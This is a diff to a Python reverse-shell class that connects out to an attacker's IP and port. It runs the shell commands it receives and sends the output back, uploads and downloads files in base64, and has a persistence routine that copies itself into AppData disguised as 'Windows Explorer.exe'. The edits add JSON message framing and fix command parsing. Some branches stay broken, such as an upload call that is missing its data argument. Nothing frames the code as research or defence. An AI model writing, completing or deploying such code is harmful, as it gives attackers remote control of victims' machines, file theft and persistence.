@@ -8,7 +8,7 @@ class ReverseShell:
         self.attacker_ip = attacker_ip
         self.attacker_port = attacker_port
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
+        self.format = 'utf-8'
 
     def become_persistence(self):
         evil_file_location = os.environ["appdata"]+"\\Windows Explorer.exe"
@@ -18,25 +18,42 @@ class ReverseShell:
     def read_file(self, path):
         try:
             with open(path,"rb") as file:
-                return base64.b64encode(file.read())
+                return base64.b64encode(file.read()).decode()
         except FileNotFoundError:
             return f"[-] file not found: {path}"
+        except Exception as e:
+            return f"[-] Error reading file: {e}"
     def write_file(self,path,content):
         with open(path,'wb')as file:
             file.write(base64.b64decode(content))
         return "[+] Uploaded successfully"
+    def sending_data(self,data):
+        if isinstance(data,bytes):
+            data =data.decode(self.format)
+        json_data = json.dumps(data)
+        self.sock.send(json_data.encode(self.format))
     
+    def receiving_data(self):
+        json_data =""
+        while True:
+            try:
+                json_data = json_data + self.sock.recv(1024).decode(self.format)
+                return json.loads(json_data)
+            except:
+                continue
+
             
     def connect(self):
         """Connects to the attacker's machine and waits for commands."""
         try:
             self.sock.connect((self.attacker_ip, self.attacker_port))
             while True:
-                command = self.sock.recv(1024).decode().strip()
+                command = self.receiving_data().strip()
+                print(command)
                 if command.lower() in ["exit", "quit"]:
                     break
                 output = self.run_command(command)
-                self.sock.send(output.encode() if output else b"Command executed.\n")
+                self.sending_data(output)
         except Exception as e:
             print(f"Connection error: {e}")
         finally:
@@ -51,13 +68,14 @@ class ReverseShell:
             elif command =="exit":
                 self.sock.connect()
                 sys.exit()
-            elif command.lower().startswith("download"):
+            elif command.startswith("download "):
+                 parts=command.split()
+                 output = self.read_file(parts[1])
+            elif command.startswith("upload "):
                  command.split()
-                 result = self.read_file(command[1])
-            elif command.lower().startswith("upload"):
-                 command.split()
-                 result = self.write_file(command[1])
-            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
+                 output = self.write_file(command[1])
+            else:
+                 output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
         except subprocess.CalledProcessError as e:
             output = e.output
         return output
